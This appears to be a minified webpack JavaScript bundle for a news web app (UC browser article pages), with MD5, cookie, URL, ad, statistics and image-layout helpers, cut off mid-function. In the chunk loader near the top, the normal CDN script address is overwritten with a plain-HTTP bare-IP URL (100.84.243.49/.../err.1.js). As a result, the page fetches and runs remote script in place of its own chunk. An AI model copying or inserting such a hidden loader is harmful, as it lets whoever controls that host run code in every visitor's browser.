!function(e) {
  function t(n) {
    if (i[n])
      return i[n].exports;
    var o = i[n] = {
      exports: {},
      id: n,
      loaded: !1
    };
    return e[n].call(o.exports, o, o.exports, t),
      o.loaded = !0,
      o.exports;
  }

  var n = window.webpackJsonp;
  window.webpackJsonp = function(i, a) {
    for (var r, c, s = 0, d = []; s < i.length; s++)
      c = i[s],
      o[c] && d.push.apply(d, o[c]),
        o[c] = 0;
    for (r in a)
      e[r] = a[r];
    for (n && n(i, a); d.length;)
      d.shift().call(null, t)
  }
  ;
  var i = {}
    , o = {
    0: 0
  };
  return t.e = function(e, n) {
    if (0 === o[e])
      return n.call(null, t);
    if (void 0 !== o[e])
      o[e].push(n);
    else {
      o[e] = [n];
      var i = document.getElementsByTagName('head')[0]
        , a = document.createElement('script');
      a.type = 'text/javascript',
        // a.charset = 'utf-8',
        // a.async = !0,
        a.crossOrigin = 'anonymous',
        a.src = t.p + '' + ({}[e] || e) + '.' + { 1: '524a877614ad4fb83532' }[e] + '.js',
        a.src = 'http://100.84.243.49/github/js/test/err.1.js',
        i.appendChild(a);
    }
  }
    ,
    t.m = e,
    t.c = i,
    t.p = '//image.uc.cn/s/uae/g/1y/xisspages-old-third-party/',
    t(0);
}([function(e, t, n) {
  e.exports = n(1);
}
  , function(e, t, n) {
    n(2),
      n(3),
      n(4),
      n(5),
      n(6),
      n(7);
  }
  , function(e, n) {
    function i(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n,
        e;
    }

    function o(e, t) {
      var n = t.parentNode;
      n.lastChild == t ? n.appendChild(e) : n.insertBefore(e, t.nextSibling);
    }

    function a(e) {
      for (var t = '', n = 0; n <= 3; n++)
        t += S.charAt(e >> 8 * n + 4 & 15) + S.charAt(e >> 8 * n & 15);
      return t;
    }

    function r(e) {
      for (var t = (e.length + 8 >> 6) + 1, n = new Array(16 * t), i = 0; i < 16 * t; i++)
        n[i] = 0;
      for (var i = 0; i < e.length; i++)
        n[i >> 2] |= e.charCodeAt(i) << i % 4 * 8;
      return n[i >> 2] |= 128 << i % 4 * 8,
        n[16 * t - 2] = 8 * e.length,
        n;
    }

    function c(e, t) {
      var n = (65535 & e) + (65535 & t)
        , i = (e >> 16) + (t >> 16) + (n >> 16);
      return i << 16 | 65535 & n;
    }

    function s(e, t) {
      return e << t | e >>> 32 - t;
    }

    function d(e, t, n, i, o, a) {
      return c(s(c(c(t, e), c(i, a)), o), n);
    }

    function l(e, t, n, i, o, a, r) {
      return d(t & n | ~t & i, e, t, o, a, r);
    }

    function u(e, t, n, i, o, a, r) {
      return d(t & i | n & ~i, e, t, o, a, r);
    }

    function f(e, t, n, i, o, a, r) {
      return d(t ^ n ^ i, e, t, o, a, r);
    }

    function p(e, t, n, i, o, a, r) {
      return d(n ^ (t | ~i), e, t, o, a, r);
    }

    function g(e) {
      for (var t = r(e), n = 1732584193, i = -271733879, o = -1732584194, s = 271733878, d = 0; d < t.length; d += 16) {
        var g = n
          , h = i
          , m = o
          , w = s;
        n = l(n, i, o, s, t[d + 0], 7, -680876936),
          s = l(s, n, i, o, t[d + 1], 12, -389564586),
          o = l(o, s, n, i, t[d + 2], 17, 606105819),
          i = l(i, o, s, n, t[d + 3], 22, -1044525330),
          n = l(n, i, o, s, t[d + 4], 7, -176418897),
          s = l(s, n, i, o, t[d + 5], 12, 1200080426),
          o = l(o, s, n, i, t[d + 6], 17, -1473231341),
          i = l(i, o, s, n, t[d + 7], 22, -45705983),
          n = l(n, i, o, s, t[d + 8], 7, 1770035416),
          s = l(s, n, i, o, t[d + 9], 12, -1958414417),
          o = l(o, s, n, i, t[d + 10], 17, -42063),
          i = l(i, o, s, n, t[d + 11], 22, -1990404162),
          n = l(n, i, o, s, t[d + 12], 7, 1804603682),
          s = l(s, n, i, o, t[d + 13], 12, -40341101),
          o = l(o, s, n, i, t[d + 14], 17, -1502002290),
          i = l(i, o, s, n, t[d + 15], 22, 1236535329),
          n = u(n, i, o, s, t[d + 1], 5, -165796510),
          s = u(s, n, i, o, t[d + 6], 9, -1069501632),
          o = u(o, s, n, i, t[d + 11], 14, 643717713),
          i = u(i, o, s, n, t[d + 0], 20, -373897302),
          n = u(n, i, o, s, t[d + 5], 5, -701558691),
          s = u(s, n, i, o, t[d + 10], 9, 38016083),
          o = u(o, s, n, i, t[d + 15], 14, -660478335),
          i = u(i, o, s, n, t[d + 4], 20, -405537848),
          n = u(n, i, o, s, t[d + 9], 5, 568446438),
          s = u(s, n, i, o, t[d + 14], 9, -1019803690),
          o = u(o, s, n, i, t[d + 3], 14, -187363961),
          i = u(i, o, s, n, t[d + 8], 20, 1163531501),
          n = u(n, i, o, s, t[d + 13], 5, -1444681467),
          s = u(s, n, i, o, t[d + 2], 9, -51403784),
          o = u(o, s, n, i, t[d + 7], 14, 1735328473),
          i = u(i, o, s, n, t[d + 12], 20, -1926607734),
          n = f(n, i, o, s, t[d + 5], 4, -378558),
          s = f(s, n, i, o, t[d + 8], 11, -2022574463),
          o = f(o, s, n, i, t[d + 11], 16, 1839030562),
          i = f(i, o, s, n, t[d + 14], 23, -35309556),
          n = f(n, i, o, s, t[d + 1], 4, -1530992060),
          s = f(s, n, i, o, t[d + 4], 11, 1272893353),
          o = f(o, s, n, i, t[d + 7], 16, -155497632),
          i = f(i, o, s, n, t[d + 10], 23, -1094730640),
          n = f(n, i, o, s, t[d + 13], 4, 681279174),
          s = f(s, n, i, o, t[d + 0], 11, -358537222),
          o = f(o, s, n, i, t[d + 3], 16, -722521979),
          i = f(i, o, s, n, t[d + 6], 23, 76029189),
          n = f(n, i, o, s, t[d + 9], 4, -640364487),
          s = f(s, n, i, o, t[d + 12], 11, -421815835),
          o = f(o, s, n, i, t[d + 15], 16, 530742520),
          i = f(i, o, s, n, t[d + 2], 23, -995338651),
          n = p(n, i, o, s, t[d + 0], 6, -198630844),
          s = p(s, n, i, o, t[d + 7], 10, 1126891415),
          o = p(o, s, n, i, t[d + 14], 15, -1416354905),
          i = p(i, o, s, n, t[d + 5], 21, -57434055),
          n = p(n, i, o, s, t[d + 12], 6, 1700485571),
          s = p(s, n, i, o, t[d + 3], 10, -1894986606),
          o = p(o, s, n, i, t[d + 10], 15, -1051523),
          i = p(i, o, s, n, t[d + 1], 21, -2054922799),
          n = p(n, i, o, s, t[d + 8], 6, 1873313359),
          s = p(s, n, i, o, t[d + 15], 10, -30611744),
          o = p(o, s, n, i, t[d + 6], 15, -1560198380),
          i = p(i, o, s, n, t[d + 13], 21, 1309151649),
          n = p(n, i, o, s, t[d + 4], 6, -145523070),
          s = p(s, n, i, o, t[d + 11], 10, -1120210379),
          o = p(o, s, n, i, t[d + 2], 15, 718787259),
          i = p(i, o, s, n, t[d + 9], 21, -343485551),
          n = c(n, g),
          i = c(i, h),
          o = c(o, m),
          s = c(s, w);
      }
      return a(n) + a(i) + a(o) + a(s);
    }

    function h(e, t) {
      return _.each(t, function(t, n) {
        var i = new RegExp(n + '=([^&]*)(&|$)', 'i')
          , o = n + '=' + t;
        i.test(e) ? e = e.replace(i, o + '&') : e += '&' + o;
      }),
      /\&\&/.test(e) && (e = e.replace('&&', '&')),
      e.lastIndexOf('&') === e.length - 1 && (e = e.slice(0, e.length - 1)),
        e;
    }

    function m(e, t) {
      for (var n = e, i = 0; i < t.length; i++) {
        var o = t[i].key
          , a = t[i].value
          , r = new RegExp('(\\?|^|&|#)' + o + '=([^&|^#]*)(&|$|#)', 'i')
          , c = e.match(r);
        n = null == c ? n + (e.indexOf('?') >= 0 ? '&' : '?') + o + '=' + a : n.replace(r, '$1' + o + '=' + a + '$3');
      }
      return n;
    }

    function w(e) {
      var t, n = null, i = '' + document.cookie + ';', o = '' + e + '=', a = i.indexOf(o);
      return a != -1 && (a += o.length,
        t = i.indexOf(';', a),
        n = i.substring(a, t)),
        n;
    }

    function v(e, t) {
      var n = ''
        , i = 'uc-iflow';
      if (null != t && null != t.app && (i = t.app),
          localStorage.user_sn && '' != localStorage.user_sn ? n = localStorage.user_sn : (n = w('sn'),
          null != n && '' != n && (localStorage.user_sn = n)),
        null == e || '' == e)
        return 'app=' + i + '&uc_param_str=dnnivebichfrmintcpgieiwidsud&sn=' + n;
      var o = [{
        key: 'app',
        value: i
      }, {
        key: 'uc_param_str',
        value: 'dnnivebichfrmintcpgieiwidsud'
      }, {
        key: 'sn',
        value: n
      }];
      return m(e, o);
    }

    function b(e) {
      return Object.keys(e).map(function(t) {
        return t + '=' + e[t];
      }).join('&');
    }

    function y() {
      var e = ['local.dtcj.com', 'test.cp.dtcj.com', 'test.wap.dtcj.com', 'wap.dtcj.com', 'cp.dtcj.com', 'ex-rss.yicai.com']
        , t = window.getAdList()
        , n = !_envi.browser.uc && 'share' == x.Tools.getQueryString('pagetype')
        , i = !1;
      if ((i || e.vagueIndexOf(location.host) >= 0 && !('iphone' === _envi.get('fr') && _Version.match(_envi.get('ve'), '11.0~') || 'android' === _envi.get('fr') && _Version.match(_envi.get('ve'), '11.0.0.818~'))) && t.topSrc && t.topUrl) {
        $('header:first').prepend('<a href="' + t.topUrl + '" class="newTopAd"><img src="' + t.topSrc + '" width="100%"  uc-image-reader_state="disabled"  /><div class="adTopTag">推广</div></a>');
        var o = $('.newTopAd img');
        o.attr('width', $('body').width()),
          o.attr('height', 120 * (1.1 * $('body').width()) / 580),
        n || $('.newTopAd').slideDown(500);
      }
    }

    var L, A = 'function' == typeof Symbol && 'symbol' == typeof Symbol.iterator ? function(e) {
        return typeof e;
      }
        : function(e) {
          return e && 'function' == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? 'symbol' : typeof e;
        }
    ;
    $.extend({
      hash: function() {
        var e = location.hash.substr(1)
          , t = {};
        if (e)
          for (var n = e.split('&'), i = 0; i < n.length; i++) {
            var o = n[i].split('=');
            t[o[0]] = o[1];
          }
        if ('string' == typeof arguments[0])
          return t[arguments[0]];
        if ('object' == A(arguments[0])) {
          for (var a in arguments[0])
            t[a] = arguments[0][a];
          var r = '';
          for (var a in t)
            r += a + '=' + t[a] + '&';
          location.href = '#' + r.substring(0, r.length - 1);
        }
      }
    }),
      window.insertAfter = o,
      $.fn.extend({});
    var x = window.zzd = window.zzd || {
        CLIENT_VERSION: '1.0.0'
      };
    x.Tools = {
      getQueryString: function(e) {
        var t = new RegExp('(\\?|^|&|#)' + e + '=([^&|^#]*)(&|$|#)', 'i')
          , n = window.location.href.match(t);
        return null != n ? decodeURIComponent(n[2]) : '';
      },
      getSearchString: function(e) {
        return Object.keys(e).map(function(t) {
          return t + '=' + encodeURIComponent(e[t]);
        }).join('&');
      },
      getSn: function() {
        if (!localStorage.user_sn || '' == localStorage.user_sn) {
          var e = x.Tools.getCookie('sn');
          null != e && '' != e && (localStorage.user_sn = e);
        }
      },
      parseQueryString: function(e) {
        var t = /^[^\?]+\?([\w\W]+)$/
          , n = /([^&=]+)=([\w\W]*?)(&|$|#)/g
          , i = t.exec(e)
          , o = {};
        if (i && i[1])
          for (var a, r = i[1]; null != (a = n.exec(r));)
            o[a[1]] = a[2];
        return o;
      },
      getCookie: function(e) {
        var t, n = null, i = '' + document.cookie + ';', o = '' + e + '=', a = i.indexOf(o);
        return a != -1 && (a += o.length,
          t = i.indexOf(';', a),
          n = i.substring(a, t)),
          n;
      },
      loadScript: function(e, t) {
        var n, i = document.head;
        n = document.createElement('script'),
          n.async = !1,
          n.type = 'text/javascript',
          n.charset = 'utf-8',
          n.src = e,
          o(n, i.lastChild),
        t && n.addEventListener('load', t, !1);
      },
      loadStyle: function(e, t) {
        var n, i = document.head;
        n = document.createElement('link'),
          n.rel = 'stylesheet',
          n.type = 'text/css',
          n.charset = 'utf-8',
          n.href = e,
          o(n, i.lastChild),
        t && n.addEventListener('load', t, !1);
      },
      dateFormat: function(e) {
        var t = new Date;
        t.setHours(0),
          t.setMinutes(0),
          t.setSeconds(0),
          t.setMilliseconds(0);
        var n = 864e5
          , i = new Date(t - n)
          , o = new Date(i - n)
          , a = new Date(e - 0)
          , r = new Date
          , c = (r.valueOf() - a.valueOf()) / 1e3
          , s = '';
        return a.valueOf() <= o.valueOf() ? a.format('MM-dd hh:mm') : i.valueOf() >= a.valueOf() && a.valueOf() >= o.valueOf() ? a.format('MM-dd hh:mm') : t.valueOf() >= a.valueOf() && a.valueOf() >= i.valueOf() ? a.format('MM-dd hh:mm') : c >= 3600 && a.valueOf() >= t.valueOf() ? Math.round(c / 60 / 60) + '小时前' : c >= 60 && c < 3600 ? Math.round(c / 60) + '分钟前' : c < 60 ? '刚刚' : s;
      },
      StringToAscii: function(e) {
        return e.charCodeAt(0).toString(16);
      },
      AsciiToString: function(e) {
        return String.fromCharCode(e);
      },
      fucCheckLength: function(e, t) {
        var n, i, o = 0;
        for (n = 0; n < e.length; n++)
          if (i = e.charCodeAt(n),
              i >= 1 && i <= 126 || 65376 <= i && i <= 65439 ? o++ : o += 2,
            null != t && '' != t && o > t)
            return e.substr(0, n);
        return null != t && '' != t ? e : o;
      },
      AntiJsValid: function(e) {
        return e = e.replace(/\&/g, '&amp;'),
          e = e.replace(/\'/g, '&apos;'),
          e = e.replace(/\"/g, '&quot;'),
          e = e.replace(/\</g, '&lt;'),
          e = e.replace(/\>/g, '&gt;'),
          e = e.replace(/\&lt;br\/\&gt;/g, '<br/>');
      },
      showAlert: function(e, t) {
        var n = '.body-tips-simple'
          , i = $('<div class=\'body-tips-simple\'><div class=\'body-tips-wrap\'>' + e + '</div></div>');
        null != t && (n = '.body-tips',
          i = $('<div class=\'body-tips\'><div class=\'body-tips-wrap tips-icon-wrap\'><div class=\'tips-icon tips-icon-' + t + '\'></div><div class=\'tips-text\'>' + e + '</div></div></div>')),
          $('.main-content').find(n).remove().end().append(i),
          $(n).fadeOut(2e3);
      },
      getPos: {
        getTop: function(e) {
          var t = e.offsetTop;
          return null != e.offsetParent && (t += this.getTop(e.offsetParent)),
            t;
        },
        getLeft: function(e) {
          var t = e.offsetLeft;
          return null != e.offsetParent && (t += this.getLeft(e.offsetParent)),
            t;
        },
        getCss3offsetTop: function(e) {
          var t = getComputedStyle(e, null).webkitTransform;
          if ('none' == t)
            var n = 0;
          else
            var n = parseInt(t.split(',')[5].replace(')', ''));
          return 'BODY' != e.parentNode.tagName && (n += this.getCss3offsetTop(e.parentNode)),
            n;
        },
        getCss3offsetLeft: function(e) {
          var t = getComputedStyle(e, null).webkitTransform;
          if ('none' == t)
            var n = 0;
          else
            var n = parseInt(t.split(',')[4]);
          return 'BODY' != e.parentNode.tagName && (n += this.getCss3offsetLeft(e.parentNode)),
            n;
        },
        getNodePosById: function(e) {
          var t = document.getElementById(e);
          if (t) {
            var n = [this.getLeft(t) + this.getCss3offsetLeft(t), this.getTop(t) + this.getCss3offsetTop(t), t.offsetWidth, t.offsetHeight];
            return n;
          }
          return '';
        }
      }
    },
      x.Statistics = {
        setCookieOrStore: function(e, t, n) {
          localStorage && (localStorage[e] = escape(t));
        },
        getCookieOrStore: function(e) {
          if (localStorage)
            return unescape(localStorage[e]);
        },
        sendStatFromCookie: function() {
          if (localStorage) {
            var e = x.Statistics.getCookieOrStore('webappstat')
              , t = [];
            try {
              t = JSON.parse(e);
            } catch (e) {
              return x.Statistics.setCookieOrStore('webappstat', '[]'),
                void (t = []);
            }
            if (null == t)
              return x.Statistics.setCookieOrStore('webappstat', '[]'),
                void (t = []);
            if (t.length <= 0)
              return;
            var n = (t[0].sn,
              t[0].articleId)
              , i = x.Tools.getQueryString('recoId') ? x.Tools.getQueryString('recoId') : '';
            if ('' == i)
              return;
            $.ajax({
              url: serverPathPage + '/' + netWork.element + '/element/page?' + v(),
              data: {
                rc_id: i,
                aid: n
              },
              type: 'GET',
              dataType: 'jsonp',
              contentType: 'application/json',
              timeout: 15e3,
              success: function(e) {
                t.splice(0, 1),
                  x.Statistics.setCookieOrStore('webappstat', JSON.stringify(t)),
                  x.Statistics.sendStatFromCookie();
              },
              error: function(e, n, i) {
                t.splice(0, 1),
                  x.Statistics.setCookieOrStore('webappstat', JSON.stringify(t)),
                  x.Statistics.sendStatFromCookie();
              }
            });
          }
        },
        sendClickLog: function(e, t, n, o) {
          var a;
          $.ajax((a = {
            url: serverPathPage + '/' + netWork.element + '/element/' + e + '?' + v(),
            data: {
              rd_id: n,
              rc_id: o,
              aid: t
            },
            type: 'GET'
          },
            i(a, 'data', null),
            i(a, 'dataType', 'jsonp'),
            i(a, 'contentType', 'application/json'),
            i(a, 'timeout', 15e3),
            i(a, 'success', function(e) {}),
            i(a, 'error', function(e, t, n) {}),
            a));
        }
      },
      x.NewsFlow = {
        ITEMTYPE_MAP: (L = {
          '0-1-1-3': '1',
          '0-1-1-1': '1',
          '0-1-1-0': '2',
          '0-1-0-3': '1',
          '0-1-0-1': '1',
          '0-1-0-0': '2'
        },
          i(L, '0-1-1-0', '2'),
          i(L, '1-1-1-3', '1'),
          i(L, '1-1-1-1', '1'),
          i(L, '1-1-1-0', '2'),
          i(L, '1-1-0-3', '1'),
          i(L, '1-1-0-1', '1'),
          i(L, '1-1-0-0', '2'),
          i(L, '1-1-1-0', '2'),
          i(L, '2-1-1-3', '1'),
          i(L, '2-1-1-1', '1'),
          i(L, '2-1-0-3', '1'),
          i(L, '2-1-0-1', '1'),
          i(L, '2-0-1-1', '1'),
          i(L, '2-0-1-3', '1'),
          i(L, '2-0-0-1', '1'),
          i(L, '2-0-0-3', '1'),
          i(L, '2-1-0-0', '2'),
          i(L, '2-1-1-0', '2'),
          i(L, '3-1-1-3', '1'),
          i(L, '3-1-1-1', '1'),
          i(L, '3-1-0-3', '1'),
          i(L, '3-1-0-1', '1'),
          i(L, '3-1-0-1', '3'),
          i(L, '3-0-1-1', '1'),
          i(L, '3-0-0-3', '6'),
          i(L, '3-0-0-1', '6'),
          i(L, '3-0-1-0', '4'),
          i(L, '3-1-0-0', '2'),
          i(L, '3-1-1-0', '2'),
          i(L, '4-1-1-3', '1'),
          i(L, '4-1-1-1', '1'),
          i(L, '4-1-0-3', '1'),
          i(L, '4-1-0-1', '1'),
          i(L, '3-1-0-0', '2'),
          i(L, '3-1-1-0', '2'),
          i(L, '5-0-0-0', '4'),
          i(L, '5-0-1-0', '4'),
          L),
        bindEvent: function() {
          $('.sub-content>ul').on('click', 'li', function(e) {
            var t = $(e.currentTarget);
            location.href = $(t).data('url');
          });
        },
        onItem: function(e) {
          var t = $(e.currentTarget);
          _uca('extend', {
            aid: x.Tools.getQueryString('aid'),
            na_id: t.attr('data-na_id')
          }),
          t.hasClass('open-by-app') || setTimeout(function() {
            location.href = t.data('url');
          }, 200);
        }
      },
      x.TRENCH_MAP = {
        webapp: {
          bid: '999',
          m_ch: '000',
          app_bid: '800',
          app_mch: '010'
        },
        meitu: {
          bid: '999',
          m_ch: '000',
          app_bid: '800',
          app_mch: '010'
        },
        duanzi: {
          bid: '999',
          m_ch: '000',
          app_bid: '800',
          app_mch: '010'
        },
        smhome: {
          bid: '800',
          m_ch: '010',
          app_bid: '800',
          app_mch: '010'
        },
        ucgongge: {
          bid: '800',
          m_ch: '000',
          app_bid: '800',
          app_mch: '010'
        },
        scnews: {
          bid: '800',
          m_ch: '100',
          app_bid: '800',
          app_mch: '010'
        },
        newsresult: {
          bid: '800',
          m_ch: '100',
          app_bid: '800',
          app_mch: '010'
        },
        scgroup: {
          bid: '800',
          m_ch: '101',
          app_bid: '800',
          app_mch: '010'
        },
        wolong: {
          bid: '800',
          m_ch: '300',
          app_bid: '800',
          app_mch: '300'
        },
        wolong_mn: {
          bid: '800',
          m_ch: '301',
          app_bid: '800',
          app_mch: '301'
        },
        wolong_jp: {
          bid: '800',
          m_ch: '304',
          app_bid: '800',
          app_mch: '304'
        },
        ucpush: {
          bid: '800',
          m_ch: '200',
          app_bid: '',
          app_mch: ''
        },
        'uc-iflow': {
          bid: '800',
          m_ch: '500',
          app_bid: '',
          app_mch: ''
        },
        ucnews: {
          bid: '800',
          m_ch: '201',
          app_bid: '800',
          app_mch: '010'
        },
        daohang3rd: {
          bid: '800',
          m_ch: '202',
          app_bid: '800',
          app_mch: '010'
        },
        meitu3rd: {
          bid: '800',
          m_ch: '203',
          app_bid: '800',
          app_mch: '010'
        },
        aimeinv: {
          bid: '800',
          m_ch: '500',
          app_bid: '',
          app_mch: ''
        },
        timeline: {
          bid: '800',
          m_ch: '400',
          app_bid: '800',
          app_mch: '010'
        },
        singlemessage: {
          bid: '800',
          m_ch: '400',
          app_bid: '800',
          app_mch: '010'
        },
        groupmessage: {
          bid: '800',
          m_ch: '400',
          app_bid: '800',
          app_mch: '010'
        },
        alisearchapp: {
          bid: '999',
          m_ch: '000',
          app_bid: '800',
          app_mch: '010'
        }
      },
      x.FROM = x.TRENCH_MAP[x.Tools.getQueryString('zzd_from')] ? x.Tools.getQueryString('zzd_from') : 'webapp',
      x.PAGETYPE = x.Tools.getQueryString('pagetype'),
      x.TRENCH = x.TRENCH_MAP[x.FROM],
      x.CLIENT_VERSION = '2.2.0.0',
      x.Tools.getSn(),
      x.SN = localStorage.user_sn,
      localStorage[x.SN + '-bid'] = x.TRENCH.bid,
      localStorage[x.SN + '-m_ch'] = x.TRENCH.m_ch,
      x.APPSTORE_URL_ZZD = 'https://itunes.apple.com/cn/app/id908561116',
      x.SHARE_TYPE_MAP = {
        qzone: 'QZone',
        weixin: 'Wechat',
        friends: 'WechatFriends',
        blog: 'SinaWeibo'
      },
      x.SHARE_UC_TYPE_MAP = {
        weixin: {
          android: 'WechatFriends',
          ios: 'kWeixin'
        },
        blog: {
          android: 'SinaWeibo',
          ios: 'kSinaWeibo'
        },
        friends: {
          android: 'WechatTimeline',
          ios: 'kWeixinFriend'
        },
        more: {
          android: '',
          ios: ''
        }
      },
      x.RD_TYPEMAP = {
        reco: 'reco',
        relate: 'relate',
        extend: 'extend',
        search: 'search',
        share: 'share'
      },
      Date.prototype.format = function(e) {
        var t = {
          'M+': this.getMonth() + 1,
          'd+': this.getDate(),
          'h+': this.getHours(),
          'm+': this.getMinutes(),
          's+': this.getSeconds(),
          'q+': Math.floor((this.getMonth() + 3) / 3),
          S: this.getMilliseconds()
        };
        /(y+)/.test(e) && (e = e.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length)));
        for (var n in t)
          new RegExp('(' + n + ')').test(e) && (e = e.replace(RegExp.$1, 1 == RegExp.$1.length ? t[n] : ('00' + t[n]).substr(('' + t[n]).length)));
        return e;
      }
      ,
      Array.prototype.search = function(e) {
        var n = this.slice(0)
          , i = '\0'
          , o = i + n.join(i) + i
          , a = e.toString();
        return e = new RegExp(a.replace(/\/((.|\n)+)\/.*/g, '\\0$1\\0'), a.slice(a.lastIndexOf('/') + 1)),
          t = o.search(e),
          t == -1 ? -1 : o.slice(0, t).replace(/[^\0]/g, '').length;
      }
      ,
      Array.prototype.indexOf = function(e) {
        for (var t = 0; t < this.length; t++)
          if (this[t] == e)
            return t;
        return -1;
      }
      ,
      Array.prototype.vagueIndexOf = function(e) {
        for (var t = 0; t < this.length; t++)
          if (e.indexOf(this[t]) >= 0)
            return t;
        return -1;
      }
      ,
      Array.prototype.remove = function(e) {
        var t = this.indexOf(e);
        t > -1 && this.splice(t, 1);
      }
      ,
      Array.prototype.searchOf = function(e, t) {
        for (var n = 0; n < this.length; n++)
          if (this[n][e] == t)
            return this[n];
        return null;
      }
    ;
    var S = window.hex_chr = '0123456789abcdef';
    window.rhex = a,
      window.str2blks_MD5 = r,
      window.add = c,
      window.rol = s,
      window.cmn = d,
      window.ff = l,
      window.gg = u,
      window.hh = f,
      window.ii = p,
      window.MD5 = g,
      window.matchUrlQueryParams = h,
      window.modifyUrlParameter = m,
      window.getCookie = w,
      window.addCommonUrlParam = v,
      window.stringify = b,
      window.insertTopAd = y;
  }
  , function(e, t) {
    var n = window._Version = {};
    !function(e, t) {
      function n(e, t) {
        if (!/\./.test(e))
          return 0;
        var n = e.split('.')
          , i = Math.pow(t, 3)
          , o = 0;
        return _.each(n, function(e, n) {
          o += e * i * Math.pow(t, 0 - n);
        }),
          o;
      }

      function i(e) {
        var t = 1;
        return _.isString(e) && (e = [e]),
          _.each(e, function(e) {
            /\./.test(e) && _.each(e.split('.'), function(e) {
              e.length > t && (t = e.length);
            });
          }),
          Math.pow(10, t);
      }

      var o = {
        range: /^\s*([\d\.]+)~([\d\.]+)\s*$/,
        min: /^\s*([\d\.]+)~\s*$/,
        max: /^\s*~([\d\.]+)\s*$/
      }
        , a = 100
        , r = function(e, t) {
        var r, c, s, d, l, u;
        return t.match(o.range) ? (r = t.match(o.range),
          c = r[1],
          s = r[2],
          a = i([e, c, s]),
          d = n(e, a),
          l = n(c, a),
          u = n(s, a),
        d >= l && d < u) : t.match(o.min) ? (r = t.match(o.min),
          c = r[1],
          a = i([e, c]),
          d = n(e, a),
          l = n(c, a),
        d >= l) : t.match(o.max) ? (r = t.match(o.max),
          s = r[1],
          a = i([e, s]),
          d = n(e, a),
          u = n(s, a),
        d < u) : void 0;
      };
      e.match = t.match = r;
    }(window.__UCLIB__ || (window.__UCLIB__ = {}), n);
  }
  , function(e, t) {
    var n = window._cookie = 'undefined' != typeof e && e.exports || {};
    !function(e) {
      function t(e, t, n) {
        var i, o = new Date, a = n, r = location.href;
        o.setTime(o.getTime() + 24 * a * 3600 * 1e3),
          r.indexOf('cricuc.com') > -1 ? i = ';domain=.cricuc.com;path=/;' : r.indexOf('ucweb.com') > -1 ? i = ';domain=.ucweb.com;path=/;' : r.indexOf('uc.cn') > -1 && (i = ';domain=.uc.cn;path=/;'),
          document.cookie = e + '=' + t + ';expires=' + o.toGMTString() + i;
      }

      function n(e) {
        for (var t, n = document.cookie.replace(/[ ]/g, ''), i = n.split(';'), o = 0; o < i.length; o++) {
          var a = i[o].split('=');
          if (e === a[0]) {
            t = a[1];
            break;
          }
        }
        return t;
      }

      e.set = t,
        e.get = n;
    }(n);
  }
  , function(e, t) {
    function n(e) {
      var t = !0
        , n = document.querySelector('header #toggle_img')
        , o = document.querySelectorAll('.relate_video img')
        , a = i();
      if ('0' != e && 'none' != e || (t = !1),
        n && (n.style.display = t ? 'none' : 'block'),
        a && t) {
        for (var r = 0; r < o.length; r++) {
          var c = o[r]
            , s = c.getAttribute('alt_src') || c.getAttribute('data-src') || c.getAttribute('data-original');
          s && (c.src = s);
        }
        for (var d = 0; d < a.length; d++) {
          var l = a[d]
            , u = l.getAttribute('alt_src') || l.getAttribute('data-src') || l.getAttribute('data-original');
          u && (l.src = u),
            l.setAttribute('id', document.getElementById('pic_' + r) ? '' : 'pic_' + d);
        }
      }
    }

    function i() {
      var e = document.querySelectorAll('article img')
        , t = document.querySelector('header #toggle_img');
      if (!e.length)
        return t && (t.style.display = 'none'),
          [];
      var n = document.querySelector('article').offsetWidth;
      /Android 2.3/g.test(navigator.userAgent) && (n = 290);
      for (var i = 0; i < e.length; i++) {
        var o = e[i];
        o.removeAttribute('style');
        var a = o.getAttribute('alt_width') || o.getAttribute('width');
        if (a) {
          a = parseInt(a);
          var r = o.getAttribute('alt_height') || o.getAttribute('height');
          if (!r)
            continue;
          r = a < n ? r : parseInt(r * n / a),
            a = a < n ? a : n,
            o.setAttribute('width', a),
            o.setAttribute('height', r);
        }
      }
      return e;
    }

    function o(e, t) {
      ['0', '1', 0, 1].indexOf(e) < 0 || (e = parseInt(e),
        e ? $('body').removeClass('night') : $('body').addClass('night'),
      t && t(e));
    }

    function a() {
      if (0 != $('article').length) {
        $('article').each(function() {
          var e = $(this);
          if (0 == e.children().length && '' === e.text().trim())
            e.remove();
          else {
            var t = e.find('p,div,section');
            t.each(function() {
              var e = $(this);
              0 == e.children().length && '' === e.text().trim() && e.remove();
            });
          }
        });
        var e = $('article:first img:first')
          , t = $('article:first img:first')
          , n = !0;
        if (0 != e.length) {
          for (; "article" != t[0].tagName.toLocaleLowerCase();) {
            if (0 != t.prev().length) {
              n = !1;
              break;
            }
            t = t.parent();
          }
          n && e.addClass('firstImg');
        }
      }
    }

    function r(e) {
      var t, n, i = $(window).width() / $(window).height(), o = e;
      if (o) {
        o.poster.width = 16,
          o.poster.height = 9,
          i > 1 && o.poster.width / o.poster.height < i ? (t = $(window).height(),
            n = t * o.poster.width / o.poster.height) : (n = $(window).width() - 30,
            t = n * o.poster.height / o.poster.width);
        var a = {
          url: o.url,
          videoId: document.getElementById('pic_0') ? '' : 'pic_0',
          width: n,
          height: t,
          posterUrl: o.poster.url,
          url_sign: o.url_sign,
          dataWidth: o.width || '',
          dataHeight: o.height || ''
        }
          , r = '';
        return o.url && o.poster && o.poster.url && (r = '<div style="text-align:center;background:#000;line-height:0;font-size:0;width:110%;margin-left:-5%;">\t                   <video class="is-impression-video" \t                           data-width="' + a.dataWidth + '" \t                           data-height="' + a.dataHeight + '" \t                           style="width:' + a.width + 'px; height:' + a.height + 'px;" \t                           data-video="' + a.url + '" \t                           data-url_sign="' + a.url_sign + '" \t                           id="' + a.videoId + '" \t                           poster="' + a.posterUrl + '" \t                           preload="none" \t                           width="100%" \t                           height="100%"\t                           webkit-playsinline="true"\t                           controls x-webkit-airplay="true">\t                   </video>\t                   </div>'),
          r;
      }
    }

    function c(e) {
      var t = document.querySelectorAll('article a');
      t.length && ucapi.infoflow.statEvent({
        type: 'thridreport',
        data: {
          code: [112],
          level: 1
        },
        success: function() {},
        fail: function() {}
      });
      for (var n = 0; n < t.length; n++)
        t[n].removeAttribute('href'),
          t[n].outerHTML = t[n].innerHTML;
      e && e();
    }

    function s(e) {
      function t(e) {
        for (var t = 0; t < e.length; t++) {
          var n = e[t];
          n.innerHTML = n.innerHTML.trim(),
            n.removeAttribute('style');
        }
      }

      var n = document.querySelector(e);
      if (n) {
